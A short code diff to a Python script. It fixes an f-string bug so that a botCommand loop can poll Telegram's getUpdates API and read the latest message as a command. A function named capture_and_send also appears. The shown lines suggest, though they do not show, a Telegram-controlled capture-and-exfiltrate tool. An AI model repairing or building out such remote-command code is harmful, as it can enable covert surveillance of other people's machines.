@@ -110,7 +110,7 @@ def capture_and_send(bot_token, chat_id):
 
 def botCommand():
     tmp = 0
-    getCommandUpdatesUrl = "https://api.telegram.org/bot{bot_token}/getUpdates"
+    getCommandUpdatesUrl = f"https://api.telegram.org/bot{bot_token}/getUpdates"
     while True:
         contents = requests.get(getCommandUpdatesUrl).json()
         cmd = contents["result"][-1]["message"]["text"]
